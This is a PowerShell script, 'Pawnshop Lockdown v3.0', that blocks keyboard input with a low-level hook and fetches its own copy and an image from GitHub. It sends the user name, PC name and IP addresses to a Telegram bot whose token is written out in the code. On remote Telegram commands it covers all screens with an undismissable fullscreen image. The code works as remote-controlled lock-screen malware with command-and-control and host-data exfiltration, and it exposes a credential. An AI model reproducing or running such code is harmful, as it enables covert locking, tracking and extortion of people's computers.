# ==========================
# Pawnshop Lockdown v3.0 - FULL CONTROL VERSION
# Supports: /lockUser, /unlockUser, /statusUser
# ==========================

[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12

# --- CONFIG ---
$imageURL   = "https://raw.githubusercontent.com/diezul/x/main/1.png"
$localPath  = "$env:APPDATA\\pawnlock.ps1"
$tempImage  = "$env:TEMP\\pawnimg.jpg"
$botToken   = "7726609488:AAF9dph4FZn5qxo4knBQPS3AnYQf1JAc8Co"
$chatID     = "656189986"
$user       = $env:USERNAME
$pc         = $env:COMPUTERNAME
$lockCmd    = "/lock$user".ToLower()
$unlockCmd  = "/unlock$user".ToLower()
$statusCmd  = "/status$user".ToLower()
$locked     = $false

# --- SAVE SCRIPT LOCALLY IF NOT EXISTS ---
if (-not (Test-Path $localPath)) {
    try {
        Invoke-WebRequest -Uri "https://raw.githubusercontent.com/diezul/x/main/pawnlock.ps1" -OutFile $localPath -UseBasicParsing
    } catch {}
}

# --- TELEGRAM MESSAGE ---
function Send-TG($msg) {
    try {
        $body = @{ chat_id = $chatID; text = $msg } | ConvertTo-Json -Compress
        Invoke-RestMethod "https://api.telegram.org/bot$botToken/sendMessage" -Method POST -Body $body -ContentType 'application/json'
    } catch {}
}

function Get-IPInfo {
    try {
        $ipLocal = (Get-NetIPAddress -AddressFamily IPv4 | Where-Object {
            $_.IPAddress -notmatch '^(127|169\.|0\.|255|fe80)' })[0].IPAddress
    } catch { $ipLocal = "n/a" }

    try { $ipPublic = Invoke-RestMethod "https://api.ipify.org" } catch { $ipPublic = "n/a" }

    return "$ipLocal | $ipPublic"
}

# --- DOWNLOAD IMAGE ---
try { Invoke-WebRequest $imageURL -OutFile $tempImage -UseBasicParsing } catch {}
# --- KEYBLOCKER CLASS ---
Add-Type @"
using System;
using System.Runtime.InteropServices;
public class KeyBlocker {
    private static IntPtr hookId = IntPtr.Zero;
    private delegate IntPtr KProc(int nCode, IntPtr wParam, IntPtr lParam);
    private static KProc proc = Hook;
    private const int WH_KEYBOARD_LL = 13;
    private const int WM_KEYDOWN = 0x0100;
    private const int WM_SYSKEYDOWN = 0x0104;
    [DllImport("user32.dll")]
    private static extern IntPtr SetWindowsHookEx(int idHook, KProc lpfn, IntPtr hMod, uint tid);
    [DllImport("user32.dll")]
    private static extern bool UnhookWindowsHookEx(IntPtr hhk);
    [DllImport("user32.dll")]
    private static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode, IntPtr wParam, IntPtr lParam);
    [DllImport("kernel32.dll")]
    private static extern IntPtr GetModuleHandle(string name);
    public static void Block() { hookId = SetHook(proc); }
    public static void Unblock() { UnhookWindowsHookEx(hookId); }
    private static IntPtr SetHook(KProc proc) {
        using (var curProcess = System.Diagnostics.Process.GetCurrentProcess())
        using (var curModule = curProcess.MainModule) {
            return SetWindowsHookEx(WH_KEYBOARD_LL, proc, GetModuleHandle(curModule.ModuleName), 0);
        }
    }
    private static IntPtr Hook(int nCode, IntPtr wParam, IntPtr lParam) {
        if (nCode >= 0 && (wParam == (IntPtr)WM_KEYDOWN || wParam == (IntPtr)WM_SYSKEYDOWN)) {
            int vkCode = Marshal.ReadInt32(lParam);
            if (vkCode == 0x43) Environment.Exit(0);
            return (IntPtr)1;
        }
        return CallNextHookEx(hookId, nCode, wParam, lParam);
    }
}
"@
[KeyBlocker]::Block()

# --- SCREEN LOCK FUNCTION ---
Add-Type -AssemblyName System.Windows.Forms,System.Drawing
$forms = $null
function Lock-Screen {
    if ($forms) { return }
    $locked = $true
    $ip = Get-IPInfo
    Send-TG "🔒 PC $user ($pc) locked.`nIP: $ip`nUnlock: $unlockCmd"
    $forms = foreach ($s in [System.Windows.Forms.Screen]::AllScreens) {
        $f = New-Object Windows.Forms.Form -Property @{
            FormBorderStyle = 'None'; WindowState = 'Maximized'; StartPosition = 'Manual'; TopMost = $true
            Location = $s.Bounds.Location; Size = $s.Bounds.Size; Cursor = 'None'; BackColor = 'Black'
        }
        $pb = New-Object Windows.Forms.PictureBox -Property @{
            Image = [System.Drawing.Image]::FromFile($tempImage); Dock = 'Fill'; SizeMode = 'StretchImage'
        }
        $f.Add_Deactivate({ $_.Activate() })
        $f.Controls.Add($pb)
        $f.Show()
        $f
    }
}
function Unlock-Screen {
    if (!$forms) { return }
    foreach ($f in $forms) { try { $f.Close() } catch {} }
    $forms = $null
    $locked = $false
    Send-TG "⚠️ Attention. $user's computer status is UNLOCKED.`n/lock$user now to protect it"
}

# --- TELEGRAM LISTENER ---
$offset = 0
try {
    $start = Invoke-RestMethod "https://api.telegram.org/bot$botToken/getUpdates" -TimeoutSec 5
    if ($start.result.Count -gt 0) {
        $offset = ($start.result | Select-Object -Last 1).update_id + 1
    }
} catch {}

$timer = New-Object Windows.Forms.Timer
$timer.Interval = 4000
$timer.Add_Tick({
    try {
        $updates = Invoke-RestMethod "https://api.telegram.org/bot$botToken/getUpdates?offset=$offset" -TimeoutSec 10
        foreach ($u in $updates.result) {
            $offset = $u.update_id + 1
            $msg = $u.message.text.ToLower()
            if ($u.message.chat.id -ne [int]$chatID) { continue }
            if ($msg -eq $lockCmd)      { Lock-Screen }
            elseif ($msg -eq $unlockCmd) { Unlock-Screen }
            elseif ($msg -eq $statusCmd) {
                $reply = if ($forms) {
                    "📍 Status of $user's computer: LOCKED"
                } else {
                    "📍 Status of $user's computer: UNLOCKED"
                }
                Send-TG $reply
            }
        }
    } catch {}
})
$timer.Start()

[System.Windows.Forms.Application]::Run()
$timer.Stop()
[KeyBlocker]::Unblock()
